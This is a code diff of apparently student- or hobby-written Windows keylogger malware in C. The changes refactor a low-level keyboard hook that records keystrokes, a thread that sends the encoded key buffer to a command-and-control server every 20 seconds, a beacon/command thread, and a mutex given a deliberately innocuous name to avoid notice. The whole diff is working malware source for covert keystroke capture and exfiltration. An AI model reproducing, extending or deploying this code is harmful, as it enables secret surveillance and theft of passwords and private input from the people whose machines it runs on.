@@ -6,8 +6,19 @@
 #include "program.h"
 #include "../client/commands.h"
 
+// prototypes for private functions
+static PROGRAM_CONTEXT* initProgramContext();
+static ERR_CODE runKeyLogger();
+static void setEncKey();
+static void doShutdown();
+
+DWORD WINAPI writeLogThread(LPVOID lpParam);
+DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam);
+LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
 
 PROGRAM_CONTEXT* progContext;
+
 
 /**
  * Sets up the primary components of the program.
@@ -23,22 +34,25 @@ ERR_CODE setup() {
 
     ERR_CODE ret = registerClient(progContext->client); // 2
     if (ret != ECODE_SUCCESS) { return ret; }
+    
+    setEncKey();  // sets keyloogger encoding key
 
     // 3 create threading mutex with a somewhat believeable name :)
     progContext->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
-    if (progContext->hMutexThreadSync == NULL) { return ECODE_NULL; } 
+    if (progContext->hMutexThreadSync == NULL)  { return ECODE_NULL; } 
     if (GetLastError() == ERROR_ALREADY_EXISTS) { return ECODE_SAFE_RET; } // 4 
 
     printf("\nPROGRAM_CONTEXT initialised...\n\n");
     return ECODE_SUCCESS;
 }
 
+
 /**
  * initialises a new program context which will how handles to the worker threads 
  * as well as the mutex
  */
-PROGRAM_CONTEXT* initProgramContext() {
-    PROGRAM_CONTEXT* prCon = (PROGRAM_CONTEXT *)malloc(sizeof(PROGRAM_CONTEXT));
+static PROGRAM_CONTEXT* initProgramContext() {
+    PROGRAM_CONTEXT* prCon = malloc(sizeof(PROGRAM_CONTEXT));
     if (prCon == NULL) { return NULL; }
 
     // create client structure
@@ -76,12 +90,12 @@ PROGRAM_CONTEXT* initProgramContext() {
 
 ERR_CODE startThreads() {
     // create the worker threads
-    HANDLE hCmdThr = CreateThread(NULL, 0, commandsAndBeaconThread, NULL, 0, NULL);
     HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);
+    HANDLE hCmdThr = CreateThread(NULL, 0, commandsAndBeaconThread, NULL, 0, NULL);
 
     // update the program context
-    progContext->hCmdThread = hCmdThr;
     progContext->hWriteThread = hWriteThr;
+    progContext->hCmdThread = hCmdThr;
     if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) {
         return ECODE_NULL;
     }
@@ -89,11 +103,53 @@ ERR_CODE startThreads() {
     ERR_CODE ret = runKeyLogger();
 
     // wait for both threads to finish
-    HANDLE threads[2] = { progContext->hCmdThread, progContext->hWriteThread };
+    HANDLE threads[2] = { progContext->hWriteThread, progContext->hCmdThread };
     WaitForMultipleObjects(2, threads, TRUE, INFINITE);
 
     printf("Threads complete!\n");
     return ret;
+}
+
+/**
+ * Function that executes infinitely until shd command is given. 
+ * Every 20 seconds it attempts to write the captured keys to the 
+ * server logs, if th write fails then it tries two more times.
+ * Then resets the kLogger
+ * 
+ * Important note: if the key buffer is empty, then don't 
+ * do anything to limit network activity.
+ */
+DWORD WINAPI writeLogThread(LPVOID lpParam) {
+    while (!progContext->shutdown) {
+        Sleep(SLP_WRITER_THREAD);
+
+        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
+        
+        KEY_LOGGER* kLogger = progContext->kLogger;
+        if (kLogger->bufferPtr == 0) { 
+            // skip the write if the buffer is empty
+            goto skipWrite; 
+        }
+
+        CLIENT_HANDLER* client = progContext->client;
+        char* buffer = kLogger->keyBuffer;
+        unsigned int writeSize = kLogger->bufferPtr;
+
+        // tries the to write the key buffer at max 3 times
+        int ret = ECODE_POST;
+        for (int i = 1; i < 3 && ret == ECODE_POST; i++) {
+            ret = writeKeyLog(client, buffer, writeSize);
+        }
+        if (ret != ECODE_SUCCESS) { printErr(ret); }
+
+        kLogger->bufferPtr = 0;
+        kLogger->keyBuffer[0] = '\0';
+        setEncKey(); // make sure to reset the encoding key
+
+        skipWrite: 
+        ReleaseMutex(progContext->hMutexThreadSync);
+    }
+    return 0;
 }
 
 /**
@@ -122,55 +178,7 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
     return 0;
 }
 
-void doShutdown() {
-    progContext->shutdown = TRUE;  // set the shutdown flag
-    // post a message to the main thread, this will cause it to stop!
-    PostThreadMessageA(progContext->mainThreadId, WM_QUIT, 0, 0);
-}
-
-
-/**
- * Function that executes infinitely until shd command is given. 
- * Every 20 seconds it attempts to write the captured keys to the 
- * server logs, if th write fails then it tries two more times.
- * Then resets the kLogger
- * 
- * Important note: if the key buffer is empty, then don't 
- * do anything to limit network activity.
- */
-DWORD WINAPI writeLogThread(LPVOID lpParam) {
-    while (!progContext->shutdown) {
-        Sleep(SLP_WRITER_THREAD);
-
-        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
-        
-        KEY_LOGGER* kLogger = progContext->kLogger;
-        if (kLogger->bufferPtr == 0) { 
-            // skip the write if the buffer is empty
-            goto skipWrite; 
-        }
-
-        CLIENT_HANDLER* client = progContext->client;
-        char* buffer = kLogger->keyBuffer;
-        unsigned int writeSize = (kLogger->bufferPtr) - 1;
-
-        // tries the to write the key buffer at max 3 times
-        int ret = ECODE_POST;
-        for (int i = 1; i < 3 && ret == ECODE_POST; i++) {
-            ret = writeKeyLog(client, buffer, writeSize);
-        }
-
-        if (ret != ECODE_SUCCESS) { printErr(ret); }
-        
-        kLogger->bufferPtr = 0;
-        kLogger->keyBuffer[0] = '\0';
-        kLogger->encKey = ENC_KEY;  // make sure to reset the encoding key state
-
-        skipWrite: 
-        ReleaseMutex(progContext->hMutexThreadSync);
-    }
-    return 0;
-}
+// System.out.println("Hello world! :)");
 
 /**
  * key logger loop that runs on the main thread!
@@ -180,7 +188,7 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
  * which posts a message to the main thread!
  * Resources: https://stackoverflow.com/questions/73340668/how-to-process-key-down-state-on-lowlevelkeyboardproc-with-wh-keyboard
  */
-ERR_CODE runKeyLogger() {
+static ERR_CODE runKeyLogger() {
     MSG msg;
     while (!progContext->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
@@ -194,15 +202,13 @@ ERR_CODE runKeyLogger() {
  * function. Creating this function was also based on the previous functions resource
  */
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (progContext->sleeping) {  // skip the program is "sleeping"
+    if (progContext->sleeping) {  // skip if the program is "sleeping"
         return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
     }
     KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = keyPress->vkCode;
 
-    // update the keylogger state structure, if it was updated return true
-    // this step does not allow shift capslock nor numlock to be put on the buffer.
-    // then skip all state update keys and non key down events
+    // skip key presses that update ke logger state, and key up events
     BOOL wasUpdated = updateKeyLoggerState(progContext->kLogger, wParam, &vkCode);
     if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
@@ -214,6 +220,21 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     }
     printf("%s\n", progContext->kLogger->keyBuffer);
     return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
+}
+
+/**
+ * The client secret key is given to them after registering and is simply
+ * 4 random bytes generated by the C2. We can then use the first byte as the 
+ * key loggers encoding key, as the C2 knows this key as well!
+ */
+static void setEncKey() {
+    progContext->kLogger->encKey = progContext->client->ENC_KEY;
+}
+
+static void doShutdown() {
+    progContext->shutdown = TRUE;  // set the shutdown flag
+    // post a message to the main thread, this will cause it to stop!
+    PostThreadMessageA(progContext->mainThreadId, WM_QUIT, 0, 0);
 }
 
 
